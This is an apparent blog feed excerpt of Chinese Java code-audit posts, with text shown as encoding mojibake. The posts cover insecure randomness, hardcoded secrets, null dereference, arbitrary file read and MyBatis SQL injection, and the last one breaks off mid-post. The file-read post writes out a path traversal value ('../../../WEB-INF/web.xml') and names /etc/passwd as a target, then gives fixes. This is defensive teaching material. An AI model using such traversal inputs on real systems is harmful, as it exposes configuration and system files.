    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#1-insecure-randomness">1ã€Insecure Randomness</a><ul><li><a href="#11-æè¿°">1.1ã€æè¿°ï¼š</a></li><li><a href="#12-å®¡è®¡æ–¹æ³•">1.2ã€å®¡è®¡æ–¹æ³•ï¼š</a></li><li><a href="#13-æ¼æ´ç¤ºä¾‹">1.3ã€æ¼æ´ç¤ºä¾‹:</a></li><li><a href="#14-æ¼æ´å±å®³">1.4ã€æ¼æ´å±å®³ï¼š</a></li><li><a href="#15-ä¿®å¤æ–¹æ¡ˆ">1.5ã€ä¿®å¤æ–¹æ¡ˆï¼š</a></li></ul></li></ul><!-- tocstop --><h1><span id="1-insecure-randomness">1ã€Insecure Randomness</span></h1><h2><span id="11-æè¿°">1.1ã€æè¿°ï¼š</span></h2><ul><li><font face="å¾®è½¯é›…é»‘">ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆPRNGï¼‰ä½¿ç”¨ç¡®å®šæ€§æ•°å­¦ç®—æ³•æ¥äº§ç”Ÿå…·æœ‰è‰¯å¥½ç»Ÿè®¡å±æ€§çš„æ•°å­—åºåˆ—ã€‚ä½†æ˜¯è¿™ç§æ•°å­—åºåˆ—å¹¶ä¸å…·æœ‰çœŸæ­£çš„éšæœºç‰¹æ€§ã€‚ä¼ªéšæœºæ•°ç”Ÿæˆå™¨é€šå¸¸ä»¥ä¸€ä¸ªç®—æœ¯ç§å­å€¼ä¸ºèµ·å§‹ã€‚ç®—æ³•ä½¿ç”¨è¯¥ç§å­å€¼ç”Ÿæˆä¸€ä¸ªè¾“å‡ºä»¥åŠä¸€ä¸ªæ–°çš„ç§å­ï¼Œè¿™ä¸ªç§å­åˆè¢«ç”¨æ¥ç”Ÿæˆä¸‹ä¸€ä¸ªéšæœºå€¼ï¼Œä»¥æ­¤ç±»æ¨ã€‚<br>Java API æä¾›äº†ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆPRNGï¼‰â€”â€” java.util.Randomç±»ã€‚è¿™ä¸ªä¼ªéšæœºæ•°ç”Ÿæˆå™¨å…·æœ‰å¯ç§»æ¤æ€§å’Œå¯é‡å¤æ€§ã€‚å› æ­¤ï¼Œå¦‚æœä¸¤ä¸ªjava.util.Randomç±»çš„å®ä¾‹åˆ›å»ºæ—¶ä½¿ç”¨çš„æ˜¯ç›¸åŒçš„ç§å­å€¼ï¼Œé‚£ä¹ˆå¯¹äºæ‰€æœ‰çš„Javaå®ç°ï¼Œå®ƒä»¬å°†ç”Ÿæˆç›¸åŒçš„æ•°å­—åºåˆ—ã€‚åœ¨ç³»ç»Ÿé‡å¯æˆ–åº”ç”¨ç¨‹åºåˆå§‹åŒ–æ—¶ï¼ŒSeedå€¼æ€»æ˜¯è¢«é‡å¤ä½¿ç”¨ã€‚åœ¨ä¸€äº›å…¶ä»–æƒ…å†µä¸‹ï¼Œseedå€¼æ¥è‡ªç³»ç»Ÿæ—¶é’Ÿçš„å½“å‰æ—¶é—´ã€‚æ”»å‡»è€…å¯ä»¥åœ¨ç³»ç»Ÿçš„ä¸€äº›å®‰å…¨è„†å¼±ç‚¹ä¸Šç›‘å¬ï¼Œå¹¶æ„å»ºç›¸åº”çš„æŸ¥è¯¢è¡¨é¢„æµ‹å°†è¦ä½¿ç”¨çš„seedå€¼ã€‚</font></li></ul><h2><span id="12-å®¡è®¡æ–¹æ³•">1.2ã€å®¡è®¡æ–¹æ³•ï¼š</span></h2><ul><li><p><font face="å¾®è½¯é›…é»‘">å…¨å±€æœç´¢ä»¥ä¸‹å…³é”®è¯</font></p><p>  <font face="å¾®è½¯é›…é»‘">â€œrandomâ€</font></p></li></ul><h2><span id="13-æ¼æ´ç¤ºä¾‹">1.3ã€æ¼æ´ç¤ºä¾‹:</span></h2><ul><li><font face="å¾®è½¯é›…é»‘">ä¾‹å¦‚åœ¨æ˜“äºçŒœæµ‹çš„å¯†ç ã€å¯é¢„æµ‹çš„åŠ å¯†å¯†é’¥ã€éªŒè¯ç ç”Ÿæˆã€æŠ½å¥–æ´»åŠ¨ã€UUIDç”Ÿæˆã€SessionIDç”Ÿæˆã€Tokenç”Ÿæˆã€CSRF Tokenã€æ‰¾å›å¯†ç Tokenã€æ¸¸æˆï¼ˆéšæœºå…ƒç´ çš„ç”Ÿæˆï¼‰ã€å¯†ç åº”ç”¨åœºæ™¯ã€ç”Ÿæˆå¯†é’¥ï¼šå¯¹ç§°å¯†ç ï¼Œæ¶ˆæ¯è®¤è¯ã€ç”Ÿæˆå¯†é’¥å¯¹ï¼šå…¬é’¥å¯†ç ï¼Œæ•°å­—ç­¾åã€ç”ŸæˆIVï¼š ç”¨äºåˆ†ç»„å¯†ç çš„CBCï¼ŒCFBå’ŒOFBæ¨¡å¼ã€ç”Ÿæˆnonce: ç”¨äºé˜²å¾¡é‡æ”¾æ”»å‡»; åˆ†ç»„å¯†ç çš„CTRæ¨¡å¼ã€ç”Ÿæˆç›ï¼šç”¨äºåŸºäºå£ä»¤çš„å¯†ç PBEç­‰ï¼Œå¯èƒ½ä¼šé™ä½ç³»ç»Ÿå®‰å…¨æ€§ã€‚<br><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H0a6d84344a8a4831973a1a50706be5ecy.png" style="zoom:30%"></center></font></font></li></ul><p><font face="å¾®è½¯é›…é»‘"><center>å›¾1ï¼šæ¼æ´ä»£ç </center></font></p><h2><span id="14-æ¼æ´å±å®³">1.4ã€æ¼æ´å±å®³ï¼š</span></h2><ul><li><font face="å¾®è½¯é›…é»‘">ç”Ÿæˆçš„éšæœºæ•°å¾ˆå®¹æ˜“é¢„æµ‹ï¼Œå¯èƒ½ä¼šé™ä½ç³»ç»Ÿå®‰å…¨æ€§ã€‚</font></li></ul><h2><span id="15-ä¿®å¤æ–¹æ¡ˆ">1.5ã€ä¿®å¤æ–¹æ¡ˆï¼š</span></h2><ul><li><font face="å¾®è½¯é›…é»‘">å› æ­¤ï¼Œjava.util.Randomç±»ä¸èƒ½ç”¨äºå®‰å…¨æ•æ„Ÿåº”ç”¨æˆ–è€…æ•æ„Ÿæ•°æ®ä¿æŠ¤ã€‚åº”ä½¿ç”¨æ›´åŠ å®‰å…¨çš„éšæœºæ•°ç”Ÿæˆå™¨ï¼Œä¾‹å¦‚java.security.SecureRandomç±»ã€‚<br><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H828ae4843a814538b5321ebcc13276f1N.png" style="zoom:30%"></center></font></font></li></ul><p><font face="å¾®è½¯é›…é»‘"><center>å›¾2ï¼šä¿®å¤ä»£ç </center></font></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-insecure-randomness&quot;&gt;1ã€Insecure Randomness&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#11-æè¿°&quot;&gt;1.1ã€æè¿°ï¼š&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#12
      
    
    </summary>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="http://www.vkxss.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Javaä»£ç å®¡è®¡" scheme="http://www.vkxss.top/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>æ•æ„Ÿä¿¡æ¯ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­</title>
    <link href="http://www.vkxss.top/2019/08/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%A1%AC%E7%BC%96%E7%A0%81%E5%9C%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD/"/>
    <id>http://www.vkxss.top/2019/08/22/ä»£ç å®¡è®¡-æ•æ„Ÿä¿¡æ¯ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­/</id>
    <published>2019-08-22T04:25:40.000Z</published>
    <updated>2019-09-20T02:01:39.853Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#1-æ•æ„Ÿä¿¡æ¯ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­">1ã€æ•æ„Ÿä¿¡æ¯ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­</a><ul><li><a href="#11-æè¿°">1.1ã€æè¿°ï¼š</a></li><li><a href="#12-å®¡è®¡æ–¹æ³•">1.2ã€å®¡è®¡æ–¹æ³•ï¼š</a></li><li><a href="#13-æ¼æ´ç¤ºä¾‹">1.3ã€æ¼æ´ç¤ºä¾‹:</a></li><li><a href="#14-æ¼æ´å±å®³">1.4ã€æ¼æ´å±å®³ï¼š</a></li><li><a href="#15-ä¿®å¤æ–¹æ¡ˆ">1.5ã€ä¿®å¤æ–¹æ¡ˆï¼š</a></li></ul></li></ul><!-- tocstop --><h1><span id="1-æ•æ„Ÿä¿¡æ¯ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­">1ã€æ•æ„Ÿä¿¡æ¯ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­</span></h1><h2><span id="11-æè¿°">1.1ã€æè¿°ï¼š</span></h2><ul><li><font face="å¾®è½¯é›…é»‘">å¦‚æœå°†æ•æ„Ÿä¿¡æ¯ï¼ˆåŒ…æ‹¬å£ä»¤å’ŒåŠ å¯†å¯†é’¥ï¼‰ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­ï¼Œå¯èƒ½ä¼šå°†æ•æ„Ÿä¿¡æ¯æš´éœ²ç»™æ”»å‡»è€…ã€‚ä»»ä½•èƒ½å¤Ÿè®¿é—®åˆ°classæ–‡ä»¶çš„äººéƒ½å¯ä»¥åç¼–è¯‘classæ–‡ä»¶å¹¶å‘ç°è¿™äº›æ•æ„Ÿä¿¡æ¯ã€‚å› æ­¤ï¼Œä¸èƒ½å°†ä¿¡æ¯ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­ã€‚åŒæ—¶ï¼Œç¡¬ç¼–ç æ•æ„Ÿä¿¡æ¯ä¼šå¢åŠ ä»£ç ç®¡ç†å’Œç»´æŠ¤çš„éš¾åº¦ã€‚</font></li></ul><h2><span id="12-å®¡è®¡æ–¹æ³•">1.2ã€å®¡è®¡æ–¹æ³•ï¼š</span></h2><ul><li><p><font face="å¾®è½¯é›…é»‘">å…¨å±€æœç´¢ä»¥ä¸‹å…³é”®è¯</font></p><p>  <font face="å¾®è½¯é›…é»‘">â€œpasswordâ€</font></p></li></ul><h2><span id="13-æ¼æ´ç¤ºä¾‹">1.3ã€æ¼æ´ç¤ºä¾‹:</span></h2><ul><li><font face="å¾®è½¯é›…é»‘">æ¶æ„ç”¨æˆ·å¯ä»¥ä½¿ç”¨javap -c IPaddresså‘½ä»¤æ¥åç¼–è¯‘classæ¥å‘ç°å…¶ä¸­ç¡¬ç¼–ç çš„æœåŠ¡å™¨IPåœ°å€ã€‚åç¼–è¯‘å™¨çš„è¾“å‡ºä¿¡æ¯é€éœ²äº†æœåŠ¡å™¨çš„æ˜æ–‡IPåœ°å€ï¼š172.16.254.1ã€‚</font><br><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H275d6113fe3d434284c6321eb4f9bf92C.png" style="zoom:30%"></center></font></li></ul><p><font face="å¾®è½¯é›…é»‘"><center>å›¾1ï¼šé”™è¯¯ä»£ç </center></font></p><h2><span id="14-æ¼æ´å±å®³">1.4ã€æ¼æ´å±å®³ï¼š</span></h2><ul><li><font face="å¾®è½¯é›…é»‘">å¾ˆå®¹æ˜“è¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œå¯¼è‡´ç³»ç»Ÿæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚</font></li></ul><h2><span id="15-ä¿®å¤æ–¹æ¡ˆ">1.5ã€ä¿®å¤æ–¹æ¡ˆï¼š</span></h2><ul><li><font face="å¾®è½¯é›…é»‘">æ•æ„Ÿä¿¡æ¯å­˜æ”¾åœ¨é…ç½®æ–‡ä»¶æˆ–æ•°æ®åº“ä¸­å¹¶åŠ å¯†å­˜å‚¨ã€‚(é‡‘èè¡Œä¸šå®‰å…¨ç³»æ•°æ›´é«˜)</font></li><li><font face="å¾®è½¯é›…é»‘">è¿™ä¸ªæ­£ç¡®ä»£ç ç¤ºä¾‹ä»ä¸€ä¸ªå®‰å…¨ç›®å½•ä¸‹çš„å¤–éƒ¨æ–‡ä»¶è·å–æœåŠ¡å™¨IPåœ°å€ã€‚å¹¶åœ¨å…¶ä½¿ç”¨å®Œåç«‹å³ä»å†…å­˜ä¸­å°†å…¶æ¸…é™¤å¯ä»¥é˜²æ­¢åç»­çš„ä¿¡æ¯æ³„éœ²ã€‚<br><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H3ccd8617113b4a349c96030085c23212T.png" style="zoom:30%"></center></font></font></li></ul><p><font face="å¾®è½¯é›…é»‘"><center>å›¾2ï¼šæ­£ç¡®ä»£ç </center></font></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-æ•æ„Ÿä¿¡æ¯ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­&quot;&gt;1ã€æ•æ„Ÿä¿¡æ¯ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#11-æè¿°&quot;&gt;1.1ã€æè¿°ï¼š&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#12-å®¡è®¡æ–¹æ³•&quot;&gt;1.2ã€å®¡è®¡æ–¹æ³•ï¼š
      
    
    </summary>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="http://www.vkxss.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Javaä»£ç å®¡è®¡" scheme="http://www.vkxss.top/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Null Dereference</title>
    <link href="http://www.vkxss.top/2019/08/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Null%20Dereference/"/>
    <id>http://www.vkxss.top/2019/08/20/ä»£ç å®¡è®¡-Null Dereference/</id>
    <published>2019-08-20T07:23:43.000Z</published>
    <updated>2019-09-20T02:01:46.172Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#1-null-dereferenceç©ºæŒ‡é’ˆå¼‚å¸¸">1ã€Null Dereferenceï¼ˆç©ºæŒ‡é’ˆå¼‚å¸¸ï¼‰</a><ul><li><a href="#11-äº§ç”ŸåŸå› ">1.1ã€äº§ç”ŸåŸå› ï¼š</a></li><li><a href="#22-ä¿®å¤æ–¹æ¡ˆ">2.2ã€ä¿®å¤æ–¹æ¡ˆï¼š</a></li></ul></li></ul><!-- tocstop --><h1><span id="1-null-dereferenceç©ºæŒ‡é’ˆå¼‚å¸¸">1ã€Null Dereferenceï¼ˆç©ºæŒ‡é’ˆå¼‚å¸¸ï¼‰</span></h1><h2><span id="11-äº§ç”ŸåŸå› ">1.1ã€äº§ç”ŸåŸå› ï¼š</span></h2><ul><li><p><font face="å¾®è½¯é›…é»‘">å½“è¿åç¨‹åºå‘˜çš„ä¸€ä¸ªæˆ–å¤šä¸ªå‡è®¾æ—¶ï¼Œé€šå¸¸ä¼šå‡ºç° null æŒ‡é’ˆå¼‚å¸¸ã€‚å¦‚æœç¨‹åºæ˜ç¡®å°†å¯¹è±¡è®¾ç½®ä¸ºnullï¼Œä½†ç¨åå´é—´æ¥å¼•ç”¨è¯¥å¯¹è±¡ï¼Œåˆ™å°†å‡ºç° dereference-after-store é”™è¯¯ã€‚æ­¤é”™è¯¯é€šå¸¸æ˜¯å› ä¸ºç¨‹åºå‘˜åœ¨å£°æ˜å˜é‡æ—¶å°†å˜é‡åˆå§‹åŒ–ä¸º nullã€‚<br>å¤§éƒ¨åˆ†ç©ºæŒ‡é’ˆé—®é¢˜åªä¼šå¼•èµ·ä¸€èˆ¬çš„è½¯ä»¶å¯é æ€§é—®é¢˜ï¼Œä½†å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ•…æ„è§¦å‘ç©ºæŒ‡é’ˆé—´æ¥å¼•ç”¨ï¼Œæ”»å‡»è€…å°±æœ‰å¯èƒ½åˆ©ç”¨å¼•å‘çš„å¼‚å¸¸ç»•è¿‡å®‰å…¨é€»è¾‘ï¼Œæˆ–è‡´ä½¿åº”ç”¨ç¨‹åºæ³„æ¼è°ƒè¯•ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯å¯¹äºè§„åˆ’éšåçš„æ”»å‡»ååˆ†æœ‰ç”¨ã€‚</font></p></li><li><p><font face="å¾®è½¯é›…é»‘">ç¤ºä¾‹ï¼šåœ¨ä¸‹åˆ—ä»£ç ä¸­ï¼Œç¨‹åºå‘˜å°†å˜é‡ foo æ˜ç¡®è®¾ç½®ä¸º nullã€‚ç¨åï¼Œç¨‹åºå‘˜é—´æ¥å¼•ç”¨ fooï¼Œè€Œæœªæ£€æŸ¥å¯¹è±¡æ˜¯å¦ä¸º null å€¼ã€‚</font><br><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H08f4d65504114216b3e145c0aade8e95w.png" style="zoom:50%"></center></font></p></li></ul><p><font face="å¾®è½¯é›…é»‘"><center>å›¾1ï¼šå¼•èµ·Null Dereferenceæ¼æ´çš„ä»£ç </center></font></p><h2><span id="22-ä¿®å¤æ–¹æ¡ˆ">2.2ã€ä¿®å¤æ–¹æ¡ˆï¼š</span></h2><ul><li><font face="å¾®è½¯é›…é»‘">åœ¨é—´æ¥å¼•ç”¨å¯èƒ½ä¸º null å€¼çš„å¯¹è±¡ä¹‹å‰ï¼Œè¯·åŠ¡å¿…ä»”ç»†æ£€æŸ¥ã€‚å¦‚æœ‰å¯èƒ½ï¼Œåœ¨å¤„ç†èµ„æºçš„ä»£ç å‘¨å›´çš„åŒ…è£…å™¨ä¸­çº³å…¥ null æ£€æŸ¥ï¼Œç¡®ä¿åœ¨æ‰€æœ‰æƒ…å†µä¸‹å‡ä¼šæ‰§è¡Œ null æ£€æŸ¥ï¼Œå¹¶æœ€å¤§é™åº¦åœ°å‡å°‘å‡ºé”™çš„åœ°æ–¹ã€‚<br><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H36460ed505d046b085a00ee8fd339827Y.png" style="zoom:50%"></center></font></font></li></ul><p><font face="å¾®è½¯é›…é»‘"><center>å›¾2ï¼šä¿®å¤Null Dereferenceæ¼æ´åçš„ä»£ç </center></font></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-null-dereferenceç©ºæŒ‡é’ˆå¼‚å¸¸&quot;&gt;1ã€Null Dereferenceï¼ˆç©ºæŒ‡é’ˆå¼‚å¸¸ï¼‰&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#11-äº§ç”ŸåŸå› &quot;&gt;1.1ã€äº§ç”ŸåŸå› ï¼š&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a
      
    
    </summary>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="http://www.vkxss.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Javaä»£ç å®¡è®¡" scheme="http://www.vkxss.top/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ä»»æ„æ–‡ä»¶è¯»å–</title>
    <link href="http://www.vkxss.top/2019/08/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    <id>http://www.vkxss.top/2019/08/19/ä»£ç å®¡è®¡-ä»»æ„æ–‡ä»¶è¯»å–/</id>
    <published>2019-08-19T06:13:12.000Z</published>
    <updated>2019-09-20T02:01:42.114Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#1-any-file-readä»»æ„æ–‡ä»¶è¯»å–">1ã€Any File Readï¼ˆä»»æ„æ–‡ä»¶è¯»å–ï¼‰</a><ul><li><a href="#11-æè¿°">1.1ã€æè¿°ï¼š</a></li><li><a href="#12-å®¡è®¡æ–¹æ³•">1.2ã€å®¡è®¡æ–¹æ³•ï¼š</a></li><li><a href="#13-æ¼æ´ç¤ºä¾‹">1.3ã€æ¼æ´ç¤ºä¾‹:</a></li><li><a href="#13-æ¼æ´å±å®³">1.3ã€æ¼æ´å±å®³:</a></li><li><a href="#14-ä¿®å¤æ–¹æ¡ˆ">1.4ã€ä¿®å¤æ–¹æ¡ˆï¼š</a></li></ul></li></ul><!-- tocstop --><h1><span id="1-any-file-readä»»æ„æ–‡ä»¶è¯»å–">1ã€Any File Readï¼ˆä»»æ„æ–‡ä»¶è¯»å–ï¼‰</span></h1><h2><span id="11-æè¿°">1.1ã€æè¿°ï¼š</span></h2><ul><li><font face="å¾®è½¯é›…é»‘">ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼ˆUnrestricted File Uploadï¼‰ï¼Œæ˜¯ä¸€ç§å¸¸è§çš„Webå®‰å…¨æ¼æ´ï¼Œå› Webç¨‹åºæä¾›çš„æ–‡ä»¶æŸ¥çœ‹ä¸‹è½½ã€é™„ä»¶ä¸‹è½½ç­‰åŠŸèƒ½å­˜åœ¨å®‰å…¨ç¼ºé™·ï¼Œå¯¼è‡´é€šè¿‡ä¿®æ”¹æ–‡ä»¶è·¯å¾„å°±èƒ½å¤ŸæŸ¥çœ‹å’Œä¸‹è½½ä»»æ„æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶åŒ…æ‹¬ï¼šæºä»£ç æ–‡ä»¶ã€ç³»ç»Ÿæ–‡ä»¶ï¼ˆ/etc/passwdã€C:/boot.iniç­‰ï¼‰ã€é…ç½®æ–‡ä»¶ï¼ˆconfig.phpã€/WEB-INF/web.xmlã€web.configç­‰ï¼‰ï¼Œé€ æˆç½‘ç«™æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œä¸¥é‡å±å®³ç½‘ç«™å®‰å…¨ã€‚</font></li></ul><h2><span id="12-å®¡è®¡æ–¹æ³•">1.2ã€å®¡è®¡æ–¹æ³•ï¼š</span></h2><ul><li><p><font face="å¾®è½¯é›…é»‘">å…¨å±€æœç´¢ä»¥ä¸‹å…³é”®è¯:</font></p><p>  <font face="å¾®è½¯é›…é»‘">â€œfileNameâ€,<br>  <font face="å¾®è½¯é›…é»‘">â€œfilePathâ€,<br>  <font face="å¾®è½¯é›…é»‘">â€œgetFileâ€,<br>  <font face="å¾®è½¯é›…é»‘">â€œgetWriterâ€,<br>  <font face="å¾®è½¯é›…é»‘">â€œMultipartFileâ€,<br>  <font face="å¾®è½¯é›…é»‘">â€œcreateNewFileâ€,<br>  <font face="å¾®è½¯é›…é»‘">â€œFileInputStreamâ€</font></font></font></font></font></font></font></p></li></ul><h2><span id="13-æ¼æ´ç¤ºä¾‹">1.3ã€æ¼æ´ç¤ºä¾‹:</span></h2><ul><li><font face="å¾®è½¯é›…é»‘">ä»£ç åœ¨ downloadFile()å‡½æ•°ä¸­è·å–è¯·æ±‚å‚æ•°ä¸­çš„affixalNameçš„å€¼ï¼Œç„¶åèµ‹å€¼ç»™ FileName å˜é‡ï¼Œæ¥ç€åœ¨ 196 è¡Œå¤„é€šè¿‡æ‹¼æ¥å­—ç¬¦ä¸²èµ‹å€¼ç»™downPath å˜é‡ï¼Œç„¶ååœ¨ 198 è¡Œå¤„è°ƒç”¨ download å‡½æ•°å¹¶æŠŠ downPath çš„å€¼ä¼ è¿›å‡½æ•°ï¼Œdownload å‡½æ•°çš„ä»£ç å¦‚ä¸‹:<br><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H9f9396106a6c41b39c4174b28d2a06a47.jpg" style="zoom:30%"></center></font></font></li></ul><p><font face="å¾®è½¯é›…é»‘"><center>å›¾1ï¼šæ¼æ´ä»£ç </center></font></p><ul><li><font face="å¾®è½¯é›…é»‘">download å‡½æ•°æŠŠ filePath å¤„çš„æ–‡ä»¶å†™åˆ° http å“åº”ä¸­ï¼Œåœ¨æ•´ä¸ªæµç¨‹ä¸­å¹¶æ²¡æœ‰å¯¹æ–‡ä»¶åçš„åˆæ³• æ€§è¿›è¡Œæ£€æŸ¥ï¼Œå­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œå¦‚é€šè¿‡æŠŠ affixalName çš„å€¼è®¾ç½® ä¸º../../../WEB-INF/web.xml å¯ä»¥ä¸‹è½½ç½‘ç«™çš„ web.xml æ–‡ä»¶ã€‚<br><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/Hfe0e4a99a5ae474190c9cf983dd8385f8.jpg" style="zoom:30%"></center></font></font></li></ul><p><font face="å¾®è½¯é›…é»‘"><center>å›¾2ï¼šæ¼æ´ä»£ç </center></font><br><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H17db51d7689144138769210fb9fcd6478.png" style="zoom:30%"></center></font></p><p><font face="å¾®è½¯é›…é»‘"><center>å›¾3ï¼šæ¼æ´ä»£ç </center></font></p><h2><span id="13-æ¼æ´å±å®³">1.3ã€æ¼æ´å±å®³:</span></h2><ul><li><font face="å¾®è½¯é›…é»‘">ä»»æ„æ–‡ä»¶è¯»å–æ˜¯å±äºæ–‡ä»¶æ“ä½œæ¼æ´çš„ä¸€ç§ï¼Œä¸€èˆ¬ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å¯ä»¥è¯»å–çš„é…ç½®ä¿¡æ¯ç”šè‡³ç³»ç»Ÿé‡è¦æ–‡ä»¶ã€‚ä¸¥é‡çš„è¯ï¼Œå°±å¯èƒ½å¯¼è‡´SSRFï¼Œè¿›è€Œæ¼«æ¸¸è‡³å†…ç½‘ã€‚</font></li></ul><h2><span id="14-ä¿®å¤æ–¹æ¡ˆ">1.4ã€ä¿®å¤æ–¹æ¡ˆï¼š</span></h2><ul><li><font face="å¾®è½¯é›…é»‘">æŒ‡å®šä¸‹è½½è·¯å¾„ä»¥é˜²æ­¢ç”¨æˆ·è¯»å–å’Œä¸‹è½½æŒ‡å®šç›®å½•ä»¥å¤–çš„æ–‡ä»¶ã€‚</font></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-any-file-readä»»æ„æ–‡ä»¶è¯»å–&quot;&gt;1ã€Any File Readï¼ˆä»»æ„æ–‡ä»¶è¯»å–ï¼‰&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#11-æè¿°&quot;&gt;1.1ã€æè¿°ï¼š&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#
      
    
    </summary>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="http://www.vkxss.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Javaä»£ç å®¡è®¡" scheme="http://www.vkxss.top/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Mybatisæ£€æŸ¥SQLæ³¨å…¥</title>
    <link href="http://www.vkxss.top/2019/08/15/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Mybatis%E6%A3%80%E6%9F%A5SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://www.vkxss.top/2019/08/15/ä»£ç å®¡è®¡-Mybatisæ£€æŸ¥SQLæ³¨å…¥/</id>
    <published>2019-08-15T06:10:40.000Z</published>
    <updated>2019-11-06T16:18:07.222Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#mybatisæ£€æŸ¥sqlæ³¨å…¥æ€»ç»“">Mybatisæ£€æŸ¥SQLæ³¨å…¥æ€»ç»“</a><ul><li><a href="#mybatisçš„-å’Œ-çš„ç”±æ¥">Mybatisçš„#{ }å’Œ${ }çš„ç”±æ¥#</a></li><li><a href="#å¦‚ä½•æ’æŸ¥">å¦‚ä½•æ’æŸ¥</a></li><li><a href="#ä¸ºä»€ä¹ˆ-å°±å®‰å…¨">ä¸ºä»€ä¹ˆ#{ }å°±å®‰å…¨</a></li><li><a href="#ä»€ä¹ˆæƒ…å†µä¸‹ç”¨ä¸äº†">ä»€ä¹ˆæƒ…å†µä¸‹ç”¨ä¸äº†#{}</a></li><li><a href="#å¦‚ä½•è§£å†³">å¦‚ä½•è§£å†³ï¼š</a></li><li><a href="#æ€»ç»“">æ€»ç»“ï¼š</a></li></ul></li></ul><!-- tocstop --><h2><span id="mybatisæ£€æŸ¥sqlæ³¨å…¥æ€»ç»“">Mybatisæ£€æŸ¥SQLæ³¨å…¥æ€»ç»“</span></h2><h3><span id="mybatisçš„-å’Œ-çš„ç”±æ¥">Mybatisçš„#{ }å’Œ${ }çš„ç”±æ¥</span></h3><ul><li><p>Mybatisçš„Mapper.xmlè¯­å¥ä¸­parameterTypeå‘SQLè¯­å¥ä¼ å‚æœ‰ä¸¤ç§æ–¹å¼ï¼š#{ }å’Œ${ 